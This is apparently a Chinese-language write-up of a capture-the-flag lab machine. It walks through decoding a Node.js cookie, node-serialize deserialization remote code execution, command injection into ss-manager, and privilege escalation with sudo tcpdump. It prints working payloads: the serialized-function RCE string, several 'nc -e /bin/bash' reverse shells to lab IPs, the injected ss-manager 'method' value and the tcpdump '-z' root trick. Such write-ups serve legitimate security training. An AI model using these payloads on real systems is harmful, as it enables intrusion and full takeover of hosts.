# mynew
burpsuit流量分析 编码解码
nojs反序列化序列化
ss-manager
sudo tcpdump 提权


# 
该项目环境也是可以直接显示IP地址！

1、nmap -p- 10.211.55.52
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
666/tcp open  http    Node.js Express framework


2、web信息枚举

Under Construction, Come Back Later!
正在建设中，稍后再来！

dirb nikto都爆破不出来，那么就进行BP流量包分析！


3、Burpsuite分析

Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0%3D
这里的%3D是url编码：=

base64解码：
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMTIn0}
{} iief立即函数调用

存在u32t4o3tb3gg431fs34ggdgchjwnza0l=值！

从错误的信息可以看出 Nodeadmin 和 Node-Serialize 正在目标应用程序上使用

发现Web服务正在使用JSON，并且Nmap扫描中有Node.js框架

谷歌搜索Node-Serialize exploit！


4、Node.js反序列化


----------熟悉了解php序列化和反序列化----------
Java、PHP、Ruby和Python有相当多的反序列化问题！

serialize：序列化
https://www.php.net/serialize
unserialize：反序列化
https://www.php.net/manual/zh/function.unserialize.php

PHP允许对象序列化。序列化是一个允许保存对象并在以后重用它的过程。例如，可以保存一个包含一些用户信息的对象，然后再使用它。

为了序列化一个对象，需要调用“序列化”函数。它将返回一个字符串表示形式，可以通过调用“unserialize”函数重新创建新的对象来重用它。

首先需要知道一点，序列化后在反序列化数据，该数据是要经过程序是：反序列化->序列化->存储调用

unserialize()通过传递带有立即调用函数表达式(IIFE)的序列化JavaScript的对象，可以利用传递到节点中的序列化模块的函数，使得不受信任的数据来实现任意代码执行。
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

IIFE：全称为立即调用函数表达式IIFE(Imdiately Invoked Function Expression)
但有时需要在定义函数之后，立即调用该函数（函数只使用一次）
https://segmentfault.com/a/1190000015089341
参考文章知道通过()可以使得一个函数表达式立即执行！

深入熟悉php注入：
https://securitycafe.ro/2015/01/05/understanding-php-object-injection/

开始利用！
--------------------------------------------------
说存在反序列化漏洞利用，这边先测试下是否存在用，反序列化函数试试：构建参数
{"username":"Admin"}
base64编码：eyJ1c2VybmFtZSI6IkFkbWluIn0=

Send回显：Hello Admin

在opsecx上面连接中，存在利用的payload：
------------------------------------------
```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}

var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
------------------------------------------

修改下：
{"username":"_$$ND_FUNC$$_function (){return require('child_process').execSync('whoami', (error, stdout, stderr) =>{ console.log(stdout);});}()"}
或者：
{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=>{console.log(out);}); }()"}

这里加入了返回参数：return
_ ND_FUNC _ function()：在本地执行一个函数
child_process是node.js中的一个模块，它以类似于popen()的方式生成子进程。
child_process.exec()方法：此方法在控制台中运行命令并缓冲输出
它指定字符串Shell执行命令（在Linux上默认：/bin/sh）

当前用户为nodeadmin！

nc -e /bin/bash 10.211.55.19 6666 
{"username":"_$$ND_FUNC$$_function (){return require('child_process').execSync('nc -e /bin/bash 192.168.139.131 6665', (error, stdout, stderr) =>{ console.log(stdout);});}()"}
```


5、内部信息收集

linpeas.sh枚举：

1）js源码
/bin/node /home/nodeadmin/.web/server.js
/usr/bin/crontab
@reboot /bin/node /home/nodeadmin/.web/server.js &
server.js就是咱们反序列化的根源代码文件！

2）存在可写入文件
You have write privileges over /etc/profile.d/modules.sh
/etc/profile.d/modules.csh
该文件有写入的权限！

3）存在SS-manager
fireman    861  0.0  0.0  37060  3648 ?        Ss   03:05   0:00  _ /usr/local/bin/ss-manager




6、提权

ss-manager是Shadowsocks-manager的缩写

Shadowsocks-libev是用于嵌入式的服务和安全SOCKS5作为代理，ss-manager用于控制多个用户的shadowsocks服务器，并在需要时生成新服务器，就是能创建新服务去利用！

payload：
https://github.com/shadowsocks/shadowsocks-libev/issues/1734
https://www.exploit-db.com/exploits/43006

nc -u 127.0.0.1 8839
添加：
{"server_port":8003, "password":"test", "method":"||touch /tmp/evil||"}
add: {"server_port":8003, "password":"test", "method":"||nc -e /bin/sh 10.211.55.19 4455 ||"}

执行发现：
/usr/local/bin/ss-manager
 2022-03-15 03:20:05 INFO: using the default manager address: 127.0.0.1:8839
运行在8839端口上！

nc枚举后发现是UDP端口：
nc -u 127.0.0.1 8839
add: {"server_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.139.131  1234 ||"}
成功拿到firename的shell！


sudo -l 
User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump


二进制文件的列表：https://gtfobins.github.io/
https://gtfobins.github.io/gtfobins/tcpdump/

echo "nc -e /bin/bash 192.168.139.131 9988" > zc
chmod +x zc
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/zc -Z root
--------------
-i : 指定监听的网络接口
-w : 直接将包写入文件中，并不分析和打印出来
-W ：与-C选项一起使用时，这会将创建的文件数量限制为指定的数字，并从头开始覆盖文件，从而创建“旋转”缓冲区。另外，它将命名带有足够前导0的文件以支持最大数量的文件，使它们能够正确排序。与-G选项一起使用时，这将限制创建的旋转转储文件的数量，在达到限制时以状态0退出。如果与-C一起使用，则行为将导致每个时间片的循环文件。
-G：如果指定，则每rotate_seconds秒旋转使用-w选项指定的转储文件。保存文件将具有由-w指定的名称，该名称 应包含由strftime（3）定义的时间格式。如果没有指定时间格式，则每个新文件都将覆盖前一个。如果与-C选项一起使用，则文件名将采用“ file <count>”的形式。
-z :  与-C或-G选项一起使用，这将使tcpdump运行“ 命令文件 ”，其中文件是每次旋转后关闭的保存文件。例如，指定-z gzip或-z bzip2将使用gzip或bzip2压缩每个保存文件。
请注意，tcpdump将与捕获并行地运行命令，使用最低优先级，这样不会干扰捕获过程。
如果你想使用一个本身带有标志或不同参数的命令，你总是可以编写一个shell脚本，将savefile的名字作为唯一的参数，使标志和参数安排并执行你想要的命令。
-Z : 删除权限（如果是root）并将用户标识更改为用户，将组标识更改为主要用户组。这种行为默认是启用的（-Z tcpdump），可以通过-Z root来禁用。
--------------


成功获得root权限！

































































































